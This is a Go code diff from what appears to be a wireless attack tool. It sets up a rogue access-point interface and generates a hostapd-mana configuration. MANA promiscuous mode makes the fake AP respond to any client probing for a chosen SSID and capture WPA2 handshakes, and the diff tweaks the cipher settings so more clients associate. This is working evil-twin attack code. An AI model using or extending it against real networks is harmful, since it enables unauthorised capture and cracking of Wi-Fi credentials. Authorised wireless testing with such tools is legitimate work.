@@ -642,11 +642,12 @@ type CaptureTarget struct {
 // prepareRogueIface tears the interface down, sets it to AP mode, and brings it back up
 // so hostapd-mana can claim it without nl80211 driver errors.
 func prepareRogueIface(userID int, iface string) error {
-	// Unmanage from NetworkManager so it stops fighting us
+	// Unmanage from NetworkManager so it stops competing for the interface.
 	sudoRun(userID, "nmcli", "device", "set", iface, "managed", "no")
-	// Cycle the interface and set AP mode
 	sudoRun(userID, "ip", "link", "set", iface, "down")
-	sudoRun(userID, "iw", iface, "set", "type", "__ap")
+	// Set to managed mode — hostapd-mana's nl80211 driver performs its own
+	// AP mode transition internally.  Forcing __ap here causes nl80211 errors.
+	sudoRun(userID, "iw", "dev", iface, "set", "type", "managed")
 	_, err := sudoRun(userID, "ip", "link", "set", iface, "up")
 	return err
 }
@@ -658,7 +659,12 @@ func generateHostapdManaConfig(iface, essid string, channel int, bssidTag string
 	}
 	capPath = fmt.Sprintf("/tmp/mana-%s.hccapx", bssidTag)
 	confPath = fmt.Sprintf("/tmp/mana-%s.conf", bssidTag)
-	conf := fmt.Sprintf("interface=%s\ndriver=nl80211\nhw_mode=%s\nchannel=%d\nssid=%s\nauth_algs=3\nwpa=2\nwpa_key_mgmt=WPA-PSK\nrsn_pairwise=CCMP\nwpa_passphrase=Mana1234!\nenable_mana=1\nmana_wpaout=%s\n",
+	// auth_algs=1  — open system auth only (WPA2 standard; shared-key is WEP-era)
+	// wpa_pairwise=TKIP CCMP — advertise both cipher suites so more client
+	//   supplicants accept the association (matches DragonShift's config)
+	// enable_mana=1 — MANA promiscuous mode: hostapd responds to any client
+	//   that probes for this SSID and captures the EAPOL 4-way handshake
+	conf := fmt.Sprintf("interface=%s\ndriver=nl80211\nhw_mode=%s\nchannel=%d\nssid=%s\nauth_algs=1\nwpa=2\nwpa_key_mgmt=WPA-PSK\nwpa_pairwise=TKIP CCMP\nrsn_pairwise=CCMP\nwpa_passphrase=12345678\nenable_mana=1\nmana_wpaout=%s\n",
 		iface, hwMode, channel, essid, capPath)
 	err = os.WriteFile(confPath, []byte(conf), 0600)
 	return
